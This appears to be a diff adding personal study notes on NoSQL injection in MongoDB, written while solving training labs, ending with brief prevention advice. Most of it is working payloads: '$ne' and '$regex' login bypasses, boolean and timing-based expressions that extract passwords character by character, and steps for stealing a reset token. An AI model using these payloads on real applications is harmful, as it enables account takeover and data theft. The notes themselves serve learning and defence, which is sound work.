@@ -1,0 +1,98 @@
+Two different types of NoSQL injection:
+- Syntax injection
+- Operator injection
+
+NoSQL syntax injection:
+- Detecting syntax injection in MongoDB:
+    ?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
+- Determining which characters are processed:
+    this.category == '''    if cause error -> broken query syntax
+    this.category == '\''   if not cause error -> vuln to injection attack
+- Confirming conditional behavior:
+    ' && 0 && 'x  ->  'abc' && 0 && 'x' -> False conditional
+    ' && 1 && 'x  ->  'abc' && 1 && 'x' -> True conditional
+- Overriding existing conditions:
+    '||'1'=='1  ->  'abc'||'1'='1'
+    Note: 
+        + Take care when injecting a condition that always evaluates to true, it's common for applications to use data from a single request in multiple different queries
+        + If an application uses it when updating or deleting data, for example, this can result in accidental data loss.
+
+NoSQL operator injection:
+    $where - Matches documents that satisfy a JavaScript expression.
+    $ne - Matches all values that are not equal to a specified value.
+    $in - Matches all of the values specified in an array.
+    $regex - Selects documents where values match a specified regular expression.
+- Submitting query operators:
+
+Exploiting syntax injection to extract data:
+- Exfiltrating data in MongoDB
+    admin' && this.password[0] == 'a' || 'a'=='b
+    admin' && this.password.match(/\d/) || 'a'=='b  -> Check this password contains at least 1 digit or not
+- Identifying field names:
+    + Just send payload for existing field and other field you don't know it exist or not
+        admin' && this.password!='  -> Try to identify if password field exist or not   
+        admin' && this.foo!='       -> Try to identify if foo field exist or not
+
+Exploiting NoSQL operator injection to extract data:
+- Injecting operators in MongoDB:
+    + Try adding the $where operator as an additional parameter
+    {"username":"wiener","password":"peter", "$where":"0"}  -> False 
+    {"username":"wiener","password":"peter", "$where":"1"}  -> True
+    + If different in response, this may indicate that the JavaScript expression in the $where clause is being evaluated
+- Extracting field names:
+    "$where":"Object.keys(this)[0].match('^.{0}a.*')"
+    "$where":"Object.keys(this)[0].charCodeAt({0}) >= 10"   -> use ascii number to compare here, this for binary search
+- Exfiltrating data using operators:
+    + In case can't run Javascript
+    {"username":"admin","password":{"$regex":"^.*"}}
+    {"username":"admin","password":{"$regex":"^a*"}}
+    + Compare response with different request
+
+Timing based injection:
+- Use case, triggering a database doesn't cause different in response
+    {"$where": "sleep(5000)"}
+    admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
+    admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
+    + Trigger time delay if password start with letter a
+
+
+01_Detecting_NoSQL_injection
+- Injection NoSQL Syntax
+- Description:
++ This lab want to display all products, so we can overriding existing conditions
+    category=fizzy%27||1==1%00 --> 'fizzy'||1==1%00
++ This syntax only keep this and ignore follow condition by %00 as a comment syntax
+
+02_Exploiting_NoSQL_operator_injection_to_bypass_authentication
+- Operator injection
+- Description:
++ Just use NoSQL injection to get admin cookies
+    {
+        "username":{ "$regex":"admin.*" },
+        "password":{ "$ne": "" }
+    }
++ Then use that cookie and go to /my-account
+
+03_Exploiting_NoSQL_injection_to_extract_data
+- Trigger NoSQL query by JavaScript -> Binary search password -> Login target account
+- Description:
++ Like in SQL injection lab, we trigger the noSQL query by JavaScript
++ Check password length first, then try to brute force password, speed up by binary search
+
+04_Exploiting_NoSQL_operator_injection_to_extract_unknown_fields
+- Trigger NoSQL query by JavaScript -> Binary search params -> Find reset password token -> Reset password -> Login target account
+- Description:
++ Interesting lab, you guys can bruteforce param name, first time i know about this
++ First we send request to get reset token
++ Then we bruteforce params name, find reset token
++ Use it as the value to reset password of target account
++ Finally, login as usual and solved the lab
++ It's take really long time with code although using binary search, i might think about speed up it later
+
+
+
+
+How to prevent:
+- Sanitize and validate user input, using an allowlist of accepted characters.
+- Insert user input using parameterized queries instead of concatenating user input directly into the query.
+- To prevent operator injection, apply an allowlist of accepted keys.
